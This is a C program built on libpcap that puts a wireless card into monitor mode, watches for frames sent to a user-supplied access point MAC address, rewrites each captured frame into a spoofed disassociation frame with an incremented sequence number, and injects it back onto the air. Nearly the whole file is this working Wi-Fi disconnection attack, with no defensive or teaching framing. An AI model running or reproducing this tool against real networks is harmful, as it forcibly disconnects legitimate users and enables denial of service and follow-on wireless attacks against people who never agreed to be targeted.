#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/udp.h>
#include <net/if_arp.h>


void callback(u_char *useless, const struct pcap_pkthdr *pkthdr,
                const u_char *packet);

void chtoMac(const u_char * mac);
void chMac(unsigned char * macAddr, unsigned char mac_bytes[]);



typedef struct wlan_Deassociate{
    unsigned short frame_control;
    unsigned short duration;
    unsigned char dst_mac[6];
    unsigned char src_mac[6];
    unsigned char bssid_mac[6];
    unsigned char frag_seq[2];
    unsigned short reason_code; // reason_code = 0x0800 ; the station leaves
} Deasso;

unsigned char AP_mac_char[30];
int deasso_len = sizeof(struct wlan_Deassociate);


int main(void)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret, res;

    struct pcap_pkthdr *header;
    const unsigned char *packet;

    pcap_if_t *alldevs;
    pcap_if_t *d;

    pcap_t *pcd;  // packet capture descriptor

    int i = 0, inum = 0;

    unsigned char AP_mac[6]; // 0x mac
    unsigned short radiotap_len;
    Deasso deauth_pkt;



    ret = pcap_findalldevs(&alldevs, errbuf);

    if (ret == -1)
    {
            printf("pcap_findalldevs: %s\n", errbuf);
            exit(1);
    }

    for(d = alldevs; d; d = d->next)
    {
            printf("%d: %s: ", ++i, d->name);
            if (d->description)
                    printf("%d description: %s\n", i, d->description);
            else
                    printf("No description available\n");

    }


    printf("Enter interface number (1-%d): ", i);

    scanf("%d", &inum);
    for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

    printf("Device: %s\n", d->name);

    /* open capture device */
    pcd = pcap_create(d->name, errbuf);
    if (pcd == NULL)
    {
        exit(-1);
    }
    if( pcap_set_rfmon(pcd, 1) == 0 )
    {
        printf("monitor mode enabled\n");
    }

    pcap_set_snaplen(pcd, 2048);  // Set the snapshot length to 2048
    pcap_set_promisc(pcd, 1); // Turn promiscuous mode on
    pcap_set_timeout(pcd, 512); // Set the timeout to 512 milliseconds
    pcap_activate(pcd);

    printf("What is the AP mac address for deassociaing? : ");
    scanf("%s", AP_mac_char); // aa:bb:cc:dd:ee:ff character type
    chMac(AP_mac_char, AP_mac);

    unsigned short disasso_subtype = htons(0xa000);

    while((res=pcap_next_ex(pcd, &header,&packet))>=0)
    {
            if (res==0) continue;
            radiotap_len = *(unsigned short *)(packet + 2);
            memcpy((void *)&deauth_pkt.frame_control, (void *)(packet + radiotap_len), 2); // frame_control
            memcpy((void *)deauth_pkt.dst_mac, (void *)(packet + radiotap_len + 4), 6); // dst_mac

            if (
                 memcmp((void *) deauth_pkt.dst_mac, (void *)AP_mac, 6) == 0 // if dst_mac == AP_mac
                 //&&
                 //memcmp((void *)&deauth_pkt.frame_control, (void *)&disasso_subtype, 2) != 0
               )
            {


                memcpy((void *)&deauth_pkt, (void *)(packet + radiotap_len), deasso_len);

                deauth_pkt.frame_control = disasso_subtype;
                deauth_pkt.reason_code = htons(0x0800);

                /**************************************/
                /* INCREMENTING SEQUENCE NUMBER PHASE */
                /* Don't try to understand the codes..*/
                /**************************************/

                unsigned char seq[2];

                seq[1] = ((deauth_pkt.frag_seq[1] >> 4) & 0x0f) + ((deauth_pkt.frag_seq[0] << 4) & 0xf0);
                seq[0] = ((deauth_pkt.frag_seq[1] << 4) & 0xf0) + ((deauth_pkt.frag_seq[0] >> 4) & 0x0f);

                unsigned short tmp_seq = *(unsigned short *)seq;
                tmp_seq += 1;

                memcpy(seq, (void *)&tmp_seq, 2);

                deauth_pkt.frag_seq[1] = ((seq[0] >> 4) & 0x0f) + ((seq[1] << 4) & 0xf0);
                deauth_pkt.frag_seq[0] = ((seq[0] << 4) & 0xf0) + ((seq[1] >> 4) & 0x0f);


                /**************************************/
                /**************************************/

                memcpy((void *)(packet + radiotap_len), (void *)(&deauth_pkt), deasso_len);

                pcap_sendpacket(pcd, packet, radiotap_len + deasso_len);

                printf("Station(");
                for(i = 0 ; i < 5; i++)
                    printf("%02x:", deauth_pkt.src_mac[i]);
                printf("%02x", deauth_pkt.src_mac[i]);
                printf(") has sent deauth pkt to ");

                printf("AP(");
                for(i = 0 ; i < 5; i++)
                    printf("%02x:", deauth_pkt.dst_mac[i]);
                printf("%02x", deauth_pkt.dst_mac[i]);
                printf(")\n");
/*
                int length = radiotap_len + deasso_len;
                int chcnt = 0;

                printf("The size of the packet : %d ", length);
                printf("bytes\n");


                printf("Raw Data :\n");

                for(int i = 0 ; i < length ; i++)
                {
                    printf("%02x ", *(packet + i));
                    if ((++chcnt % 16) == 0)
                        printf("\n");
                }

                printf("\n==============================================\n");
                printf("\n\n");


*/
            }

    }
    //pcap_loop(pcd, 0, callback, NULL); // packet capture occurs 2nd argument times;
}

void chtoMac(const u_char * mac) // change mac address from byte_array to AA:BB:CC:DD:FF:GG
{
    for(int i = 0 ; i < 5 ; i++)
    {
        printf("%02x:", *mac);
        mac++;
    }
    printf("%02x\n", *mac);

}

void chMac(unsigned char * macAddr, unsigned char mac_bytes[]) // chaning aa:bb:cc:dd:ee:ff -> network byte order
{
    char tmp[3];
    for(int i = 0 ; i < 6; i++)
    {
        strncpy(tmp,(char *)macAddr,2);
        tmp[2] = 0;
        mac_bytes[i] = (char)strtoul(tmp, NULL, 16);
        macAddr += 3;
    }

}
